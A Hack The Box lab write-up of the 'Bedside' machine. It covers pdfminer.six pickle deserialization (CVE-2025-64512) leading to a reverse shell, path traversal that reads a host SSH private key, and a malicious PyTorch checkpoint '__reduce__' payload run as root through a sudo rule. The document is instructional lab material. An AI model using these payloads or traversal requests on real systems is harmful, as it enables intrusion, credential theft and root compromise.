<img src="images/bedside.png" alt="Hack The Box Bedside machine icon" width="110" />

# Bedside - Hack The Box Writeup

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-F0A13B)
![Operating System](https://img.shields.io/badge/OS-Linux-FCC624?logo=linux&logoColor=black)

*A Linux machine covering PDFMiner exploitation, Docker pivoting, path traversal, and PyTorch deserialization for root privilege escalation.*

by: Brandon Chaney

## Overview

Bedside starts with an unsuspecting clinic website. A virtual host scan reveals a portal accepting images, PDFs, and archives, and exposes a vulnerable PDF processor. Exploitation leads inside a Docker container of a development server, and path traversal can be used to read the user `developer`'s SSH key.

The root path comes from the sole sudo permission of `developer`, the ability to run `/usr/bin/python3 /opt/trainer/bedside_trainer.py` passwordless. The script executed as root loads checkpoints from a directory writeable by the container account `datawrangler`. An unsafe PyTorch checkpoint can be used to execute commands as root, leading to full system compromise.

## Enumeration

I started with Nmap. SSH and Apache were open, and port `3000` was **filtered**. It's inaccessible outward-facing but will prove useful later.

```bash
┌──[brandonc@parrot]─[~]
└─❯ nmap -sV -sC -A 10.129.134.251

PORT     STATE    SERVICE VERSION
**22/tcp   open     ssh     OpenSSH 10.0p2 Debian
**80/tcp   open     http    Apache httpd 2.4.68
3000/tcp filtered ppp

|_http-title: Did not follow redirect to http://bedside.htb/
```

I added `bedside.htb` to `/etc/hosts`. The main website's functionality was limited to a single home page, so I moved to directory and virtual host enumeration. Directory scans mostly returned `index.php` and normal Apache paths. The vhost scan was more useful:

```bash
┌──[brandonc@parrot]─[~]
└─❯ ffuf -u http://bedside.htb/ \
  -H "Host: FUZZ.bedside.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac -o bedside-vhosts.json -of json

┌──[brandonc@parrot]─[~]
└─❯ jq -r '.results[] | "\(.input.FUZZ) - HTTP \(.status)"' bedside-vhosts.json
research - HTTP 200
```

I mapped `research.bedside.htb` to the machine IP, revealing a **Bedside Research Portal** with a file upload section. It accepted images, DICOM files, PDFs, and ZIP/GZ archives. It also mentioned that certain files might be converted for AI training, so I had to be careful my files were unaltered by checking hashes before and after upload.

## Testing the Upload

I wasn't sure how difficult this would be, as it was my first Medium machine, so I hastily tried for PHP remote execution. I first checked whether uploaded files were retrievable:

```bash
┌──[brandonc@parrot]─[~]
└─❯ curl -I http://research.bedside.htb/uploads/test.zip
HTTP/1.1 200 OK
Content-Type: application/zip
```

The zip was reachable, but its contents weren't extracted server-side (I tried reaching a test file from inside the zip named `probe.txt`  which returned `404`). Asking for `.php` files in `/uploads/` gave `403`, even for invalid filenames, so I couldn't tell whether PHP was actually present.

I tried a PHP file disguised as a PNG. The server wasn't fooled by the extension or the HTTP MIME header:

```bash
┌──[brandonc@parrot]─[~]
└─❯ curl -s \
  -F "uploadFile=@probe.php.png;type=image/png" \
  http://research.bedside.htb/ | grep 'class="message"'
<div class="message">MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads</div>
```

That error was useful for two reasons: 1. From this I could tell the application checked more than just the filename, and 2. The response gave away the full upload directory `/var/www/research.bedside.htb/uploads`.

I futilely tried looking for a PHP upload exploit again, this time with an actual PNG with PHP appended at the end. This time the upload succeeded, but downloading the file showed the PHP source still there as it was, without execution.

```bash
┌──[brandonc@parrot]─[~]
└─❯ cp test.png polyglot.php.png
┌──[brandonc@parrot]─[~]
└─❯ printf '\n<?php echo "HTB_EXECUTION_TEST"; ?>\n' >> polyglot.php.png
┌──[brandonc@parrot]─[~]
└─❯ curl -s -F "uploadFile=@polyglot.php.png;type=image/png" \
  http://research.bedside.htb/ | grep 'class="message"'
<div class="message">File uploaded successfully: polyglot.php.png</div>

┌──[brandonc@parrot]─[~]
└─❯ curl -s http://research.bedside.htb/uploads/polyglot.php.png -o polyglot-returned.png
┌──[brandonc@parrot]─[~]
└─❯ strings polyglot-returned.png | grep -E 'HTB_EXECUTION_TEST|<\?php'
<?php echo "HTB_EXECUTION_TEST"; ?>
```

Unwilling to give up, I compared downloaded PNG, PDF, and DICOM files with the originals' `sha256sum`, and the hashes matched. I was spending too much time on upload extensions without there being evidence that PHP execution was even possible.

The clue I decided to pivot on was the response header:

```http
X-Powered-By: pdfminer.six
```

## PDFMiner - Code Execution via Uploads

Looking into `pdfminer.six`, I found **CVE-2025-64512**, an unsafe-deserialization vulnerability in its CMap loading code. A PDF can name a character-map file, and vulnerable PDFMiner versions can load a gzip-compressed pickle from an attacker-controlled location. Python's `pickle.loads()` can execute code while rebuilding an object.

This was where the earlier upload-path error became important. I didn't have to guess where my pickle would end up: the portal told me, and it let me upload `.pickle.gz` files there.

```bash
┌──[brandonc@parrot]─[~]
└─❯ curl -I http://research.bedside.htb/uploads/cmap-probe.pickle.gz
HTTP/1.1 200 OK
Content-Type: application/x-gzip
```

The exploit required **two files**, not just a malicious PDF:

1. A `.pickle.gz` file in the known uploads directory.
2. A PDF whose font `/Encoding` references that file's absolute path. PDFMiner appends `.pickle.gz` when looking up the CMap.

I built the PDF with the font encoding pointing to the uploaded pickle. The interesting part of the PDF object was:

```pdf
/Type /Font
/Subtype /Type0
/BaseFont /TestFont
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fcmap-net
/DescendantFonts [6 0 R]
```

Here, `#2F` represents `/` in a PDF name. The reference ultimately resolves to the uploaded file under `/var/www/research.bedside.htb/uploads/`. I included the payload-building code in [`scripts/build_pdfminer_payload.py`](scripts/build_pdfminer_payload.py) so the mechanics are available without turning this section into a wall of Python.

I first tested with a harmless HTTP callback instead of immediately launching a shell. On Parrot:

```bash
┌──[brandonc@parrot]─[~]
└─❯ python3 -m http.server 8000 --bind 10.10.14.206
Serving HTTP on 10.10.14.206 port 8000 ...
```

After uploading `cmap-net.pickle.gz` and `trigger-net.pdf`, the target contacted my server:

```text
10.129.134.251 - - "GET / HTTP/1.1" 200 -
10.129.134.251 - - "GET / HTTP/1.1" 200 -
10.129.134.251 - - "GET / HTTP/1.1" 200 -
```

The requests arrived roughly 30 seconds apart. At first I only knew the upload worked; the callback was the first real proof that **the server had parsed the PDF and run my payload**.

I then switched to a reverse-shell payload. I used `10.10.14.206` on `tun0` and port `4444`:

```bash
┌──[brandonc@parrot]─[~]
└─❯ nc -lvnp 4444
```

```bash
┌──[brandonc@parrot]─[~]
└─❯ curl -s \
  -F "uploadFile=@cmap-shl.pickle.gz;type=application/gzip" \
  http://research.bedside.htb/ | grep 'class="message"'
<div class="message">File uploaded successfully: cmap-shl.pickle.gz</div>

┌──[brandonc@parrot]─[~]
└─❯ curl -s \
  -F "uploadFile=@trigger-shl.pdf;type=application/pdf" \
  http://research.bedside.htb/ | grep 'class="message"'
<div class="message">File uploaded successfully: trigger-shl.pdf</div>
```

The listener received a connection:

```bash
datawrangler@data-wrangler:/app$ whoami
datawrangler

datawrangler@data-wrangler:/app$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)

datawrangler@data-wrangler:/app$ hostname
data-wrangler
```

<p align="center">
  <img src="images/pdfminer-path.drawio.svg" width="850" alt="Diagram of the PDFMiner upload and deserialization path" />
  <br/>
  <em>Figure 1: Both files land in the upload directory. The PDF worker reads the PDF, follows its CMap reference, and deserializes the uploaded pickle as datawrangler.</em>
</p>

*One small terminal mistake along the way: I pasted a Python heredoc into Zsh and got `zsh: event not found: r`. Disabling history expansion with `unsetopt BANG_HIST` let me rerun the script cleanly. I also learned to keep heredoc delimiters on their own lines, especially in the limited reverse shell.*

## Inside the Data-Wrangler Container

The hostname was different from `bedside`, and the filesystem had `/.dockerenv`, so I was in a Docker container rather than on the host. My first flag searches in `/home` and `/app` came up empty.

```bash
datawrangler@data-wrangler:/app$ ls -la /app
-rw-rw-r-- 1 root root 2191 Nov 10 2025 pdf_watcher.py
-rw-rw-r-- 1 root root   23 Nov  9 2025 requirements.txt
```

The file I actually found in `/app` was `pdf_watcher.py`. Its core behavior explained the repeating callbacks:

```python
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"
SLEEP_INTERVAL = 30

# Inside its loop:
subprocess.run(["pdf2txt.py", pdf_path, "-o", output_file], timeout=10, check=True)
```

The worker scanned uploaded PDFs every 30 seconds and extracted their text to `/datastore/staging`. This was how my malicious PDF kept triggering. I also found that `/datastore` and the uploads directory were mounted into the container from the host filesystem.

```bash
datawrangler@data-wrangler:/app$ cat /proc/self/mountinfo | grep -E 'datastore|research.bedside'
249 241 8:4 /datastore /datastore rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
253 241 8:4 /var/www/research.bedside.htb/uploads /var/www/research.bedside.htb/uploads rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
```

Having writable storage didn't give me an escape by itself. Instead, I revisited **port 3000**, the filtered port from my original scan.

## Port 3000 — From Docker to the Host

From Parrot, TCP port `3000` timed out. From inside the container, it was reachable:

```bash
datawrangler@data-wrangler:/app$ curl -i --max-time 8 http://10.129.134.251:3000/
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<title>Bedside Clinic - Image Viewer</title>
```

The page was a React-based MRI image viewer with hot module reloading. Its source referenced `/@hmr`, and later I learned the process was launched with `/usr/bin/esm.sh serve .`. I tried a couple of normal file requests, but `/package.json` and `/.env` returned 404.

I then tested whether the development server would let me request files outside its web root. The important `curl` flag was `--path-as-is`, which keeps `../` segments intact instead of normalizing them away on my side:

```bash
datawrangler@data-wrangler:/app$ curl --path-as-is -i \
  "http://10.129.134.251:3000/../../../../etc/hostname"
HTTP/1.1 200 OK
Content-Type: application/octet-stream

bedside
```

That was my breakthrough. I could read the **host's** `/etc/hostname`, not the container's. I checked `/etc/passwd` next and found `developer`, UID 1000. The server's process status also showed it ran with UID 1000:

```bash
datawrangler@data-wrangler:/app$ curl -s --path-as-is \
  "http://10.129.134.251:3000/../../../../proc/self/status" \
  | grep -E 'Name|Uid|Gid'
Name:   esm.sh
Uid:    1000 1000 1000 1000
Gid:    1000 1000 1000 1000
```

That same traversal gave me the **user flag**:

```bash
datawrangler@data-wrangler:/app$ curl -s --path-as-is \
  "http://10.129.134.251:3000/../../../../home/developer/user.txt"
[redacted user flag]
```

I was still sitting in a container shell, though, and I wanted actual host access. Looking into `developer`'s SSH directory paid off:

```bash
datawrangler@data-wrangler:/app$ curl -i --path-as-is \
  "http://10.129.134.251:3000/../../../../home/developer/.ssh/id_rsa"
HTTP/1.1 200 OK
Content-Type: application/octet-stream

-----BEGIN OPENSSH PRIVATE KEY-----
[redacted]
-----END OPENSSH PRIVATE KEY-----
```

Despite the name `id_rsa`, the file contained an **unencrypted Ed25519 key**. I saved it to `developer_key` on Parrot, restricted its permissions, and used it to SSH directly into the machine:

```bash
┌──[brandonc@parrot]─[~]
└─❯ chmod 600 developer_key
┌──[brandonc@parrot]─[~]
└─❯ ssh -i developer_key developer@10.129.134.251

developer@bedside:~$ whoami
developer
developer@bedside:~$ hostname
bedside
```

<p align="center">
  <img src="images/container-pivot.drawio.svg" width="850" alt="Diagram of the container to host pivot through port 3000" />
  <br/>
  <em>Figure 2: The container could reach the internal image viewer. A path traversal exposed developer's SSH key, which gave me an interactive shell on bedside.</em>
</p>

At that point, **I had the user flag and a proper shell as `developer` on the host**.

## Privilege Escalation — The MONAI Trainer

My first command after SSH was `sudo -l`:

```bash
developer@bedside:~$ sudo -l

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

I couldn't edit the script itself—it was owned by root—but I could read it. It was a MONAI/PyTorch training script that used directories under `/datastore`:

```python
CHECKPOINT_DIR = Path("/datastore/checkpoints")
PROCESSED_DIR = Path("/datastore/processed")
STAGING_DIR = Path("/datastore/staging")
```

The interesting part was how it selected and loaded checkpoints:

```python
def find_latest_checkpoint(checkpoint_dir):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

# Later in main():
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
loader = CheckpointLoader(
    load_path=str(latest_ckpt),
    load_dict={"model": model, "optimizer": optimizer},
    map_location=DEVICE
)
loader(engine)
```

This is where the two accounts fit together. **`developer` could launch the trainer as root, but couldn't even list `/datastore/checkpoints`**. Meanwhile, `datawrangler` inside Docker could write there. The restricted account had access to the data; the privileged process trusted that data.

I checked the installed libraries: PyTorch `2.5.0+cpu`, MONAI `1.5.0`. Reading the implementation of `CheckpointLoader.__call__` revealed the line that mattered:

```python
checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
```

Unlike a restricted weights-only load, this permits unpickling objects that may execute Python code. I didn't need to change the root-owned trainer—I needed to make it load a file I controlled.

There was one catch: the script **exits before loading a checkpoint if there are no training samples**. So I used my `datawrangler` shell to create a small valid PNG in `/datastore/processed/`. Then I placed a `.pt` checkpoint containing a malicious `data.pkl` in `/datastore/checkpoints/`. The complete construction is in [`scripts/build_checkpoint.py`](scripts/build_checkpoint.py); the essential payload was:

```python
class RootProof:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (["/bin/sh", "-c", "id > /tmp/root-proof.txt"],))
```

<p align="center">
  <img src="images/checkpoint-privesc.drawio.svg" width="850" alt="Diagram of the writable checkpoint and root-run trainer" />
  <br/>
  <em>Figure 3: datawrangler supplies a training image and checkpoint through shared storage; developer's permitted sudo command makes root load the unsafe checkpoint.</em>
</p>

### Working through the last errors

At first I ran the trainer with an extra `--epochs 1` argument, and `sudo` prompted for a password even though the listed permission was `NOPASSWD`. I dropped the extra argument and used the exact permitted command with `-n` to prevent an interactive password prompt:

```bash
developer@bedside:~$ sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
2026-10-16 15:28:19 | INFO | Using 1 samples for training.
2026-10-16 15:28:19 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_999.pt, loading with CheckpointLoader (callable mode)...
TypeError: Argument checkpoint should be a string or a dictionary, but given <class 'bytes'>
```

The exception initially looked like failure. In reality, the command inside the checkpoint ran **during deserialization**, before MONAI tried to treat the result as a legitimate training checkpoint. The error came afterward.

My first payload made a SUID copy of Bash at `/tmp/rootbash`. It was owned by root and had the SUID bit, but running it didn't elevate me because `/tmp` was mounted with `nosuid`:

```bash
developer@bedside:~$ findmnt -no OPTIONS /tmp
rw,nosuid,nodev,nr_inodes=1048576,inode64
```

I changed the checkpoint payload to a simpler proof and reran the same sudo command:

```bash
developer@bedside:~$ cat /tmp/root-proof.txt
uid=0(root) gid=0(root) groups=0(root)
```

That was the confirmation I needed: **the checkpoint executed with UID 0**, even though my interactive SSH session was still `developer`.

## Root Flag

For the final run, I replaced the checkpoint payload with a command to copy the root flag to a readable temporary file:

```python
command = "cp /root/root.txt /tmp/bedside-root-flag && chmod 644 /tmp/bedside-root-flag"
```

I triggered the trainer again using the same allowed sudo command:

```bash
developer@bedside:~$ sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
# The same post-deserialization TypeError followed.

developer@bedside:~$ ls -l /tmp/bedside-root-flag
-rw-r--r-- 1 root root 33 /tmp/bedside-root-flag

developer@bedside:~$ cat /tmp/bedside-root-flag
[redacted root flag]
```

I had **both flags**. Something worth clarifying: I didn't finish inside an interactive root shell. I had proven **root command execution**, and I used that execution to retrieve the root flag. My SSH shell still belonged to `developer`. I could have used the same primitive to launch a root reverse shell, but it wasn't needed to complete the machine.

## Key Findings

- The main clinic page was a dead end, but virtual-host enumeration found `research.bedside.htb` and its upload portal.
- The portal checked file contents, so simply disguising PHP as a PNG didn't lead to execution. The upload error disclosed the absolute server path, which turned out to matter later.
- **CVE-2025-64512** let a crafted PDF direct vulnerable PDFMiner to an attacker-supplied `.pickle.gz`, giving code execution as `datawrangler` in Docker.
- Port `3000` was filtered externally but accessible from the container. The development server allowed path traversal outside its web root, exposing `developer`'s SSH key.
- A successful SSH login gave an interactive `developer` shell and access to the user flag.
- The root-run MONAI trainer loaded checkpoint files from a `datawrangler`-writable directory with **`torch.load(..., weights_only=False)`**. That trust boundary enabled root code execution.
